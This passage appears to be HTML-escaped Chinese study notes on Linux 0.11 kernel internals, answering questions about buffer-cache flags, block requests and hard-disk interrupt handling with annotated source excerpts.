&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fs/buffer.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;wait_on_buffer&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; buffer_head * bh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cli();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (bh-&amp;gt;b_lock)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		sleep_on(&amp;amp;bh-&amp;gt;b_wait); &lt;span class=&#34;comment&#34;&gt;//bh在哪? bh全局的,buf init那里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//不要傻等,切进程, 有主动轮询变为被动响应&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sti();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;31、操作系统如何利用b-uptodate保证缓冲块数据的正确性？new-block-int-dev-函数新申请一个缓冲块后，并没有读盘，b-uptodate却被置1，是否会引起数据混乱？详细分析理由。&#34;&gt;&lt;a href=&#34;#31、操作系统如何利用b-uptodate保证缓冲块数据的正确性？new-block-int-dev-函数新申请一个缓冲块后，并没有读盘，b-uptodate却被置1，是否会引起数据混乱？详细分析理由。&#34; class=&#34;headerlink&#34; title=&#34;31、操作系统如何利用b_uptodate保证缓冲块数据的正确性？new_block (int dev)函数新申请一个缓冲块后，并没有读盘，b_uptodate却被置1，是否会引起数据混乱？详细分析理由。&#34;&gt;&lt;/a&gt;31、操作系统如何利用b_uptodate保证缓冲块数据的正确性？new_block (int dev)函数新申请一个缓冲块后，并没有读盘，b_uptodate却被置1，是否会引起数据混乱？详细分析理由。&lt;/h1&gt;&lt;p&gt;p325、328、329&lt;/p&gt;
&lt;p&gt;​		b_uptodate针对进程方向,它的作用是告诉内核,只要缓冲块的b_uptodate位1,则缓冲块的数据就是数据块中最新的了,可以放心地支持进程共享缓冲块的数据.反之如果为0,就提醒内核缓冲块并没有用绑定的数据块中的数据更新,不支持进程共享该缓冲块&lt;/p&gt;
&lt;p&gt;​		new_block是在设备商申请一个新的数据块,那么数据块里面此时是脏数据,不用管(&lt;font color=&#34;red&#34;&gt;是要管的,需要清零&lt;/font&gt;),那为啥把b_uptodate设置为1呢,因为缓冲块里也是脏数据,&lt;font color=&#34;red&#34;&gt;缓冲块和数据块都是脏数据,根本就不需要同步,同步也是浪费时间和精力&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		下面进行详细的分析,新建的数据块只能用于两种用途,一种是存储文件的内容,一种是存储文件的i_zone的间接块管理信息.&lt;/p&gt;
&lt;p&gt;​		如果是存储文件的内容的话,就是上面所说,都是垃圾数据,不需要同步,不需要清零的其实,问题已经解决(或者说本身没有问题)&lt;/p&gt;
&lt;p&gt;​		如果是存储i_zone的间接块管理信息,&lt;font color=&#34;red&#34;&gt;则必须将缓冲块清零,表示没有索引间接数据块,否则垃圾数据会导致索引错误,破坏文件操作的正确性&lt;/font&gt;,这个时候虽然缓冲块和硬盘数据块的数据不一致,但和第一种情况一样,b_uptodate设置为1即可	&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fs/Bitmap.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;new_block&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dev)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bh-&amp;gt;b_count != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		panic(&lt;span class=&#34;string&#34;&gt;&amp;quot;new block: count is != 1&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	clear_block(bh-&amp;gt;b_data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	bh-&amp;gt;b_uptodate = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	bh-&amp;gt;b_dirt = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	brelse(bh);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; j;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;32、add-request（）函数中有下列代码-其中的xxx是什么意思？&#34;&gt;&lt;a href=&#34;#32、add-request（）函数中有下列代码-其中的xxx是什么意思？&#34; class=&#34;headerlink&#34; title=&#34;32、add_request（）函数中有下列代码   其中的xxx是什么意思？&#34;&gt;&lt;/a&gt;32、add_request（）函数中有下列代码   其中的xxx是什么意思？&lt;/h1&gt;&lt;p&gt;p121&lt;/p&gt;
&lt;p&gt;赵炯的书p202&lt;/p&gt;
&lt;p&gt;​		测试块设备的当前请求项指针是不是为空(也就是没有请求项,设备空闲)，如果是的话,就会设置该新建的请求项为当前请求项,作为请求项链表的表头&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;blk_dev&amp;#x2F;ll_rw_block.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * add-request adds a request to the linked list.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * It disables interrupts so that it can muck with the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * request-lists in peace.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add_request&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; blk_dev_struct * dev, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; request * req)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!(tmp = dev-&amp;gt;current_request)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		dev-&amp;gt;current_request = req;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		sti();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		(dev-&amp;gt;request_fn)(); &lt;span class=&#34;comment&#34;&gt;// &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;问的是,以下代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!(tmp = dev-&amp;gt;current_request)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		dev-&amp;gt;current_request = req;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;33、do-hd-request-函数中dev的含义始终一样吗？&#34;&gt;&lt;a href=&#34;#33、do-hd-request-函数中dev的含义始终一样吗？&#34; class=&#34;headerlink&#34; title=&#34;33、do_hd_request()函数中dev的含义始终一样吗？&#34;&gt;&lt;/a&gt;33、do_hd_request()函数中dev的含义始终一样吗？&lt;/h1&gt;&lt;p&gt;p122&lt;/p&gt;
&lt;p&gt;赵炯p195&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;blk_dev&amp;#x2F;hd.c&lt;/p&gt;
&lt;h1 id=&#34;34、read-intr（）函数中，下列代码是什么意思？为什么这样做&#34;&gt;&lt;a href=&#34;#34、read-intr（）函数中，下列代码是什么意思？为什么这样做&#34; class=&#34;headerlink&#34; title=&#34;34、read_intr（）函数中，下列代码是什么意思？为什么这样做?&#34;&gt;&lt;/a&gt;34、read_intr（）函数中，下列代码是什么意思？为什么这样做?&lt;/h1&gt;&lt;p&gt;p131&lt;/p&gt;
&lt;p&gt;​		read_intr()函数会将已经读到硬盘缓存中的数据复制到刚才被锁定的那个缓冲块中(注意,锁定的意思是阻止进程方面的操作,而不是阻止外设方面的操作)&lt;/p&gt;
&lt;p&gt;​		但是一次不一定就读完呀,所以就会有下面的代码,来判断请求项对应的缓冲块的数据是否读完了,如果没有读完的话,内核将再次把read_intr()绑定在硬盘中断服务程序上,以待下次使用,之后中断服务程序返回&lt;/p&gt;
&lt;p&gt;​		其实还没太理解这个–,是减的什么东西&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;blk_dev&amp;#x2F;hd.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;read_intr&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (win_result()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		bad_rw_intr();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		do_hd_request();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	port_read(HD_DATA,CURRENT-&amp;gt;buffer,&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	CURRENT-&amp;gt;errors = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	CURRENT-&amp;gt;buffer += &lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	CURRENT-&amp;gt;sector++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (--CURRENT-&amp;gt;nr_sectors) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		do_hd = &amp;amp;read_intr; &lt;span class=&#34;comment&#34;&gt;//再来一次&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	end_request(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	do_hd_request();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;问的是这一段代码是什么意思&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (--CURRENT-&amp;gt;nr_sectors) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		do_hd = &amp;amp;read_intr; &lt;span class=&#34;comment&#34;&gt;//再来一次&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		请求项的结构体在哪?&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;lkd_drv&amp;#x2F;blk.h&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * Ok, this is an expanded form so that we can use the same&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * request for paging requests when that is implemented. In&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * paging, &amp;#x27;bh&amp;#x27; is NULL, and &amp;#x27;waiting&amp;#x27; is used to wait for&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * read/write completion.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;request&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dev;		&lt;span class=&#34;comment&#34;&gt;/* -1 if no request */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cmd;		&lt;span class=&#34;comment&#34;&gt;/* READ or WRITE */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; errors;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; sector;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; nr_sectors;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; * buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;task_struct&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;waiting&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;buffer_head&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;bh&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;request&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;next&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;35、bread（）函数代码中为什么要做第二次if-bh-gt-b-uptodate-判断&#34;&gt;&lt;a href=&#34;#35、bread（）函数代码中为什么要做第二次if-bh-gt-b-uptodate-判断&#34; class=&#34;headerlink&#34; title=&#34;35、bread（）函数代码中为什么要做第二次if (bh-&amp;gt;b_uptodate)判断?&#34;&gt;&lt;/a&gt;35、bread（）函数代码中为什么要做第二次if (bh-&amp;gt;b_uptodate)判断?&lt;/h1&gt;&lt;p&gt;p112、134.   赵炯 p342&lt;/p&gt;
&lt;p&gt;第一次是在找有没有被使用过的&lt;/p&gt;
&lt;p&gt;fs&amp;#x2F;buffer.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 